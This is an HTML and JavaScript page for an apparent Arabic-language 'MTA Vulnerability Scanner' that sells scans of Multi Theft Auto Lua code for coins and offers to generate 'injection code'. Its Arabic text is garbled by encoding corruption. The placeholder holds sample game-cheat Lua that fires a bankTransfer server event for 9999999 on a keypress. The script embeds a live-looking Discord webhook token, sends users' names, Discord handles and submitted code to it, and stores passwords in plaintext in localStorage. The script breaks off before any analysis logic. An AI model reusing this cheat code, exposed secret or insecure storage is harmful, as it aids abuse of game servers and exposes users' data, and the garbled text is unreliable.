<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTA Vulnerability Scanner - Ù†Ø¸Ø§Ù… Ø§Ù„Ø¹Ù…Ù„Ø§Øª</title>
    <style>
        :root {
            --primary-color: #0a0a0a;
            --secondary-color: #1a1a1a;
            --accent-color: #ff4444;
            --gold-color: #ffd700;
            --light-color: #e0e0e0;
            --dark-color: #333333;
            --text-color: #ffffff;
            --code-bg: #1e1e1e;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--primary-color);
            color: var(--text-color);
            line-height: 1.6;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„Ø¹Ù…Ù„Ø§Øª */
        .coins-bar {
            background: linear-gradient(135deg, #b8860b 0%, #ffd700 50%, #b8860b 100%);
            color: #000;
            padding: 15px 30px;
            border-radius: 10px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
            border: 2px solid #ffd700;
        }
        
        .coins-display {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1.3rem;
            font-weight: bold;
        }
        
        .coin-icon {
            font-size: 1.8rem;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { transform: scale(1); }
            to { transform: scale(1.1); }
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .auth-buttons {
            display: flex;
            gap: 10px;
        }
        
        .btn-auth {
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .btn-auth:hover {
            background: #ff6666;
            transform: translateY(-2px);
        }
        
        header {
            background-color: var(--secondary-color);
            color: var(--text-color);
            padding: 25px 0;
            text-align: center;
            border-radius: 10px;
            margin-bottom: 25px;
            border: 1px solid #444;
            position: relative;
            overflow: hidden;
        }
        
        header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--accent-color), var(--gold-color), var(--accent-color));
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: var(--accent-color);
            text-shadow: 0 2px 10px rgba(255, 68, 68, 0.3);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
            color: var(--light-color);
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
        }
        
        @media (max-width: 968px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }
        
        .code-section, .analysis-section {
            background-color: var(--secondary-color);
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
            border: 1px solid #444;
        }
        
        .section-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--accent-color);
            border-bottom: 2px solid var(--accent-color);
            padding-bottom: 10px;
        }
        
        textarea {
            width: 100%;
            height: 300px;
            padding: 15px;
            background-color: var(--code-bg);
            color: var(--light-color);
            border: 1px solid #555;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            margin-bottom: 20px;
        }
        
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .input-row {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .input-row label {
            min-width: 120px;
            font-weight: bold;
        }
        
        .input-row input, .input-row select {
            padding: 10px 15px;
            background-color: var(--code-bg);
            color: var(--light-color);
            border: 1px solid #555;
            border-radius: 6px;
            flex: 1;
        }
        
        .btn {
            background-color: var(--accent-color);
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn:hover {
            background-color: #ff6666;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background-color: #444;
        }
        
        .btn-secondary:hover {
            background-color: #666;
        }
        
        .btn-success {
            background-color: #4CAF50;
        }
        
        .btn-success:hover {
            background-color: #45a049;
        }
        
        .buttons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .analysis-result, .exploit-code {
            background-color: var(--code-bg);
            border: 1px solid #555;
            border-radius: 6px;
            padding: 20px;
            margin-top: 15px;
            min-height: 200px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            color: var(--light-color);
            overflow-y: auto;
            max-height: 400px;
        }
        
        .output-box {
            background-color: var(--code-bg);
            color: #4CAF50;
            padding: 20px;
            border-radius: 6px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            border: 1px solid #555;
            min-height: 150px;
        }
        
        .explanation {
            margin-top: 30px;
            padding: 20px;
            background-color: var(--secondary-color);
            border-radius: 6px;
            border-right: 4px solid var(--accent-color);
            border: 1px solid #444;
        }
        
        footer {
            text-align: center;
            margin-top: 40px;
            padding: 25px;
            color: var(--light-color);
            font-size: 0.9rem;
            border-top: 1px solid #444;
        }
        
        .legal-notice {
            background-color: #332222;
            border: 1px solid #663333;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 25px;
            color: #ff9999;
        }
        
        .tab-container {
            margin-top: 20px;
        }
        
        .tabs {
            display: flex;
            border-bottom: 1px solid #444;
        }
        
        .tab {
            padding: 12px 24px;
            cursor: pointer;
            background-color: var(--secondary-color);
            border: 1px solid #444;
            border-bottom: none;
            border-radius: 6px 6px 0 0;
            margin-right: 5px;
        }
        
        .tab.active {
            background-color: var(--accent-color);
            color: white;
        }
        
        .tab-content {
            display: none;
            padding: 20px;
            background-color: var(--secondary-color);
            border: 1px solid #444;
            border-top: none;
            border-radius: 0 0 6px 6px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .exploit-info {
            margin-top: 20px;
            padding: 15px;
            background-color: #222244;
            border-radius: 6px;
            border-left: 4px solid #4444ff;
        }
        
        .vulnerability-item {
            background: #2a2a2a;
            margin: 10px 0;
            padding: 15px;
            border-radius: 6px;
            border-right: 4px solid var(--accent-color);
        }
        
        .vuln-critical { border-right-color: #ff4444; }
        .vuln-high { border-right-color: #ff6b6b; }
        .vuln-medium { border-right-color: #ffa726; }
        .vuln-low { border-right-color: #42a5f5; }
        
        .severity {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: bold;
            margin-left: 10px;
        }
        
        .critical { background: #ff4444; }
        .high { background: #ff6b6b; }
        .medium { background: #ffa726; }
        .low { background: #42a5f5; }
        
        .copy-btn {
            background: #555;
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            margin-top: 10px;
            font-size: 12px;
        }
        
        .copy-btn:hover {
            background: #666;
        }
        
        /* Ù†Ù…Ø· ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        .auth-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .auth-content {
            background: var(--secondary-color);
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 500px;
            border: 2px solid var(--accent-color);
        }
        
        .auth-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .auth-form input {
            padding: 12px;
            background: var(--code-bg);
            border: 1px solid #555;
            border-radius: 6px;
            color: white;
            font-size: 16px;
        }
        
        .discord-link {
            background: #5865F2;
            color: white;
            text-decoration: none;
            padding: 12px;
            border-radius: 6px;
            text-align: center;
            display: block;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .discord-link:hover {
            background: #4752c4;
        }
        
        .coins-cost {
            color: var(--gold-color);
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <!-- Ø´Ø±ÙŠØ· Ø§Ù„Ø¹Ù…Ù„Ø§Øª -->
    <div class="coins-bar">
        <div class="coins-display">
            <span class="coin-icon">ğŸª™</span>
            <span id="coinsCount">0</span> Ø¹Ù…Ù„Ø©
        </div>
        <div class="user-info">
            <span id="userStatus">ØºÙŠØ± Ù…Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„</span>
            <div class="auth-buttons">
                <button class="btn-auth" onclick="showAuthModal()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                <button class="btn-auth" onclick="showRegisterModal()">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</button>
            </div>
        </div>
    </div>

    <div class="container">
        <header>
            <h1>Ù…Ø­Ù„Ù„ Ø«ØºØ±Ø§Øª MTA - Ù†Ø¸Ø§Ù… Ø§Ù„Ø¹Ù…Ù„Ø§Øª</h1>
            <p class="subtitle">Ø­Ù„Ù„ ÙƒÙˆØ¯ Lua ÙˆØ§ÙƒØ³Ø¨ Ø§Ù„Ø¹Ù…Ù„Ø§Øª - ÙƒÙ„ ØªØ­Ù„ÙŠÙ„ ÙŠÙƒÙ„Ù Ø¹Ù…Ù„Ø© ÙˆØ§Ø­Ø¯Ø©</p>
        </header>
        
        <div class="legal-notice">
            <strong>Ù…Ù„Ø§Ø­Ø¸Ø© Ù‚Ø§Ù†ÙˆÙ†ÙŠØ©:</strong> Ù‡Ø°Ø§ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø®ØµØµ ÙÙ‚Ø· Ù„Ø£ØºØ±Ø§Ø¶ Ù‚Ø§Ù†ÙˆÙ†ÙŠØ© Ù…Ø«Ù„ Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ø«ØºØ±Ø§Øª ÙÙŠ Ø³ÙŠØ±ÙØ±Ø§Øª MTA Ø§Ù„ØªÙŠ ØªØ¯ÙŠØ±Ù‡Ø§. Ù„Ø§ ØªØ³ØªØ®Ø¯Ù… Ù‡Ø°Ù‡ Ø§Ù„Ø£Ø¯Ø§Ø© Ù„Ø£ÙŠ Ø£Ù†Ø´Ø·Ø© ØºÙŠØ± Ù‚Ø§Ù†ÙˆÙ†ÙŠØ©.
        </div>
        
        <div class="main-content">
            <div class="code-section">
                <h2 class="section-title">Ø£Ø¯Ø®Ù„ ÙƒÙˆØ¯ Lua</h2>
                <textarea id="luaCode" placeholder="function exploitFunction()
    triggerServerEvent('onPlayerExploit', resourceRoot, playerData)
end

function hackMoney()
    triggerServerEvent('bankTransfer', root, 9999999, 'admin')
end

bindKey('F1', 'down', exploitFunction)
bindKey('F2', 'down', hackMoney)"></textarea>
                
                <div class="input-group">
                    <div class="input-row">
                        <label for="bindKey">Ø²Ø± Ø§Ù„ØªÙ†Ø´ÙŠØ·:</label>
                        <input type="text" id="bindKey" placeholder="F1" maxlength="5" value="F1">
                    </div>
                </div>
                
                <div class="coins-cost">â“˜ ÙƒÙ„ ØªØ­Ù„ÙŠÙ„ ÙŠÙƒÙ„Ù Ø¹Ù…Ù„Ø© ÙˆØ§Ø­Ø¯Ø©</div>
                
                <div class="buttons">
                    <button id="analyzeBtn" class="btn">Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø«ØºØ±Ø§Øª (1 Ø¹Ù…Ù„Ø©)</button>
                    <button id="generateBtn" class="btn btn-secondary">ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù†</button>
                    <button id="exploitBtn" class="btn">Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø«ØºØ±Ø©</button>
                </div>
            </div>
            
            <div class="analysis-section">
                <h2 class="section-title">Ù†ØªØ§Ø¦Ø¬ Ø§Ù„ØªØ­Ù„ÙŠÙ„</h2>
                
                <div class="tab-container">
                    <div class="tabs">
                        <div class="tab active" data-tab="analysis">Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ©</div>
                        <div class="tab" data-tab="exploitCode">ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù†</div>
                        <div class="tab" data-tab="output">Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬</div>
                    </div>
                    
                    <div class="tab-content active" id="analysisTab">
                        <div id="analysisResult" class="analysis-result">
                            ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…Ø­Ù„Ù„...
                        </div>
                    </div>
                    
                    <div class="tab-content" id="exploitCodeTab">
                        <div id="exploitCodeResult" class="exploit-code">
                            ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ø±Ø¤ÙŠØ© ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù†...
                        </div>
                        <button class="copy-btn" onclick="copyExploitCode()">Ù†Ø³Ø® ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù†</button>
                    </div>
                    
                    <div class="tab-content" id="outputTab">
                        <div id="outputBox" class="output-box">
                            ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ø±Ø¤ÙŠØ© Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬...
                        </div>
                    </div>
                </div>
                
                <div class="exploit-info">
                    <h3>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø«ØºØ±Ø©:</h3>
                    <p id="exploitInfo">ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ø±Ø¤ÙŠØ© Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø«ØºØ±Ø©</p>
                </div>
            </div>
        </div>
        
        <div class="explanation">
            <h3>ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù†Ø¸Ø§Ù…:</h3>
            <p>â€¢ ÙƒÙ„ Ù…Ø³ØªØ®Ø¯Ù… ÙŠØ¨Ø¯Ø£ Ø¨ 3 Ø¹Ù…Ù„Ø§Øª Ù…Ø¬Ø§Ù†ÙŠØ©</p>
            <p>â€¢ ÙƒÙ„ ØªØ­Ù„ÙŠÙ„ Ù„Ù„ÙƒÙˆØ¯ ÙŠÙƒÙ„Ù Ø¹Ù…Ù„Ø© ÙˆØ§Ø­Ø¯Ø©</p>
            <p>â€¢ ÙŠÙ…ÙƒÙ† Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠÙ† Ù…Ù†Ø­ Ø£Ùˆ Ø³Ø­Ø¨ Ø§Ù„Ø¹Ù…Ù„Ø§Øª</p>
            <p>â€¢ ÙŠØ¬Ø¨ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø¯Ø¹Ù…</p>
        </div>
        
        <footer>
            <p>Ø£Ø¯Ø§Ø© ØªØ­Ù„ÙŠÙ„ Ø«ØºØ±Ø§Øª MTA - Ù…Ø®ØµØµØ© Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠÙ† ÙˆØ§Ù„Ù…Ø·ÙˆØ±ÙŠÙ† Ù„Ø£ØºØ±Ø§Ø¶ Ù‚Ø§Ù†ÙˆÙ†ÙŠØ© ÙÙ‚Ø·</p>
            <p>Â© 2023 - Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©</p>
        </footer>
    </div>

    <!-- Ù†Ø§ÙØ°Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div id="authModal" class="auth-modal">
        <div class="auth-content">
            <h2>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>
            <div class="auth-form">
                <input type="text" id="loginUsername" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…">
                <input type="password" id="loginPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                <button class="btn btn-success" onclick="login()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                <a href="https://discord.gg/y4yNAkSF" class="discord-link" target="_blank">ğŸš¨ Ø§Ù†Ø¶Ù… Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ù„Ù„Ø¯Ø¹Ù…</a>
                <button class="btn btn-secondary" onclick="hideAuthModal()">Ø¥Ù„ØºØ§Ø¡</button>
            </div>
        </div>
    </div>

    <!-- Ù†Ø§ÙØ°Ø© Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ -->
    <div id="registerModal" class="auth-modal">
        <div class="auth-content">
            <h2>Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</h2>
            <div class="auth-form">
                <input type="text" id="regUsername" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (ÙÙŠ Ø§Ù„Ù…ÙˆÙ‚Ø¹)">
                <input type="text" id="regDiscord" placeholder="Ø§Ø³Ù…Ùƒ ÙÙŠ Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ (Ù…Ø«Ø§Ù„: user#1234)">
                <input type="password" id="regPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                <button class="btn btn-success" onclick="register()">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</button>
                <a href="https://discord.gg/y4yNAkSF" class="discord-link" target="_blank">ğŸ¯ ÙŠØ¬Ø¨ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ø£ÙˆÙ„Ø§Ù‹</a>
                <button class="btn btn-secondary" onclick="hideRegisterModal()">Ø¥Ù„ØºØ§Ø¡</button>
            </div>
        </div>
    </div>

    <script>
        // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†
        let users = JSON.parse(localStorage.getItem('vulnerability_users')) || {};
        let currentUser = null;
        let userCoins = 0;

        // ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1441187636717817936/rQpQjMmGrbiW4ufv9K9PaTGuCjaWa54n0fpegeLlwm5P1VKoJWvS9Uq8Nkavy7mbpFLl';

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', function() {
            checkAuthStatus();
            updateCoinsDisplay();
            // Ø¥Ø±Ø³Ø§Ù„ Ø­Ø§Ù„Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
            sendSiteStatus();
        });

        // Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù†ÙˆØ§ÙØ° Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø©
        function showAuthModal() {
            document.getElementById('authModal').style.display = 'flex';
        }

        function hideAuthModal() {
            document.getElementById('authModal').style.display = 'none';
        }

        function showRegisterModal() {
            document.getElementById('registerModal').style.display = 'flex';
        }

        function hideRegisterModal() {
            document.getElementById('registerModal').style.display = 'none';
        }

        // Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù„Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ù…Ø¹ Embed
        async function sendDiscordWebhook(type, data) {
            try {
                let embed;
                
                switch(type) {
                    case 'new_user':
                        embed = {
                            title: "ğŸ†• Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯",
                            color: 0x00FF00,
                            fields: [
                                { name: "ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", value: data.username, inline: true },
                                { name: "ğŸ® Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯", value: data.discord, inline: true },
                                { name: "ğŸª™ Ø§Ù„Ø¹Ù…Ù„Ø§Øª", value: data.coins.toString(), inline: true },
                                { name: "â° Ø§Ù„ÙˆÙ‚Øª", value: new Date().toLocaleString('ar-EG'), inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        };
                        break;
                        
                    case 'login':
                        embed = {
                            title: "ğŸ” ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„",
                            color: 0x0099FF,
                            fields: [
                                { name: "ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", value: data.username, inline: true },
                                { name: "ğŸª™ Ø§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©", value: data.coins.toString(), inline: true },
                                { name: "â° Ø§Ù„ÙˆÙ‚Øª", value: new Date().toLocaleString('ar-EG'), inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        };
                        break;
                        
                    case 'scan_used':
                        embed = {
                            title: "ğŸ” Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…Ø§Ø³Ø­",
                            color: 0xFFA500,
                            fields: [
                                { name: "ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", value: data.username, inline: true },
                                { name: "ğŸ“ Ø·ÙˆÙ„ Ø§Ù„ÙƒÙˆØ¯", value: `${data.code_length} Ø­Ø±Ù`, inline: true },
                                { name: "ğŸª™ Ø§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©", value: data.coins_remaining.toString(), inline: true },
                                { name: "â° Ø§Ù„ÙˆÙ‚Øª", value: new Date().toLocaleString('ar-EG'), inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        };
                        break;
                        
                    case 'vulnerability_scan':
                        embed = {
                            title: "âš ï¸ ØªØ­Ù„ÙŠÙ„ Ø«ØºØ±Ø§Øª",
                            color: 0xFF4444,
                            fields: [
                                { name: "ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", value: data.username, inline: true },
                                { name: "ğŸ¯ Ø¹Ø¯Ø¯ Ø§Ù„Ø«ØºØ±Ø§Øª", value: data.vulnerabilities_count.toString(), inline: true },
                                { name: "ğŸ“ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù…Ø¯Ø®Ù„", value: `\`\`\`lua\n${data.original_code.substring(0, 1000)}${data.original_code.length > 1000 ? '...' : ''}\n\`\`\``, inline: false },
                                { name: "ğŸ”§ ÙƒÙˆØ¯ Ø§Ù„Ø«ØºØ±Ø©", value: `\`\`\`lua\n${data.exploit_code.substring(0, 1000)}${data.exploit_code.length > 1000 ? '...' : ''}\n\`\`\``, inline: false },
                                { name: "ğŸª™ Ø§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©", value: data.coins_remaining.toString(), inline: true },
                                { name: "â° Ø§Ù„ÙˆÙ‚Øª", value: new Date().toLocaleString('ar-EG'), inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        };
                        break;
                        
                    case 'site_status':
                        embed = {
                            title: "ğŸŒ Ø­Ø§Ù„Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹",
                            color: 0x5865F2,
                            fields: [
                                { name: "ğŸ‘¥ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ù…Ø³Ø¬Ù„ÙŠÙ†", value: data.total_users.toString(), inline: true },
                                { name: "ğŸ” Ø¹Ù…Ù„ÙŠØ§Øª Ø§Ù„Ù…Ø³Ø­", value: data.total_scans.toString(), inline: true },
                                { name: "ğŸª™ Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø¹Ù…Ù„Ø§Øª", value: data.total_coins.toString(), inline: true },
                                { name: "ğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©", value: "ğŸŸ¢ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¹Ù…Ù„ Ø¨Ø´ÙƒÙ„ Ø·Ø¨ÙŠØ¹ÙŠ", inline: false },
                                { name: "â° Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«", value: new Date().toLocaleString('ar-EG'), inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        };
                        break;
                }

                const payload = {
                    username: 'MTA Vulnerability Scanner',
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/3063/3063812.png',
                    embeds: [embed]
                };

                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ:', response.status);
                }
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ:', error);
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø­Ø§Ù„Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹
        function sendSiteStatus() {
            const totalUsers = Object.keys(users).length;
            const totalScans = Object.values(users).reduce((sum, user) => sum + (user.scans || 0), 0);
            const totalCoins = Object.values(users).reduce((sum, user) => sum + user.coins, 0);
            
            sendDiscordWebhook('site_status', {
                total_users: totalUsers,
                total_scans: totalScans,
                total_coins: totalCoins
            });
        }

        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
        function login() {
            const username = document.getElementById('loginUsername').value;
            const password = document.getElementById('loginPassword').value;

            if (!username || !password) {
                alert('ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„');
                return;
            }

            const user = Object.values(users).find(u => u.username === username && u.password === password);
            
            if (user) {
                currentUser = user;
                userCoins = user.coins;
                localStorage.setItem('current_user', JSON.stringify(user));
                updateCoinsDisplay();
                hideAuthModal();
                
                // Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù„Ù„ØªØ³Ø¬ÙŠÙ„
                sendDiscordWebhook('login', {
                    username: user.username,
                    coins: user.coins
                });
                
                alert('ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­!');
            } else {
                alert('Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø©');
            }
        }

        // Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨
        function register() {
            const username = document.getElementById('regUsername').value;
            const discord = document.getElementById('regDiscord').value;
            const password = document.getElementById('regPassword').value;

            if (!username || !discord || !password) {
                alert('ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„');
                return;
            }

            if (users[username]) {
                alert('Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…ÙˆØ¬ÙˆØ¯ Ù…Ø³Ø¨Ù‚Ø§Ù‹');
                return;
            }

            // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯
            users[username] = {
                username: username,
                discord: discord,
                password: password,
                coins: 3, // 3 Ø¹Ù…Ù„Ø§Øª Ø¨Ø¯Ø§ÙŠØ©
                scans: 0,
                createdAt: new Date().toISOString()
            };

            localStorage.setItem('vulnerability_users', JSON.stringify(users));
            
            // Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¬Ø¯ÙŠØ¯
            sendDiscordWebhook('new_user', {
                username: username,
                discord: discord,
                coins: 3
            });

            alert('ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­! ÙŠÙ…ÙƒÙ†Ùƒ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¢Ù†.');
            hideRegisterModal();
            showAuthModal();
        }

